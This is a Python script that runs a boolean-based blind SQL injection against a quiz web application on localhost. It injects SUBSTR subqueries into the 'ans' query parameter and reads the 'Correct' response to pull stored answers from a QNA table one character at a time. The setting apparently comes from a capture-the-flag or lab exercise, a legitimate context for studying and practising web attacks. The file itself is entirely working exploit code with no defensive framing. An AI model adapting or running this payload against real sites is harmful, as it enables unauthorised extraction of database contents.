import requests
import string

if __name__ == "__main__":
    url = "http://127.0.0.1:80/"
    posistion = 1
    exifLeakData = ''
    char_set = string.ascii_letters + string.digits + '''!"$%'()*+,-./:;<=>?@[\\]^_`{|}~'''
    id = 1

    while True:
        for character in char_set:
            payload = f'''2' AND (SELECT SUBSTR(Answer, {posistion}, 1) FROM QNA WHERE ID={id} LIMIT 1 OFFSET 0) = '{character}'-- -'''
            print(f'[*] Trying Payload: {payload}', end='\r')
            requestResult = requests.get(f'{url}?qn_id=1&ans={payload}')

            if 'Correct' in requestResult.text:
                exifLeakData += ''.join(character)
                print(f'[+] Found answer: {exifLeakData} in question ID {id}, payload: {payload}')
                posistion += 1
                break
        else:
            print('[-] Looped through all potential characters, no matched character.\n')
            id += 1
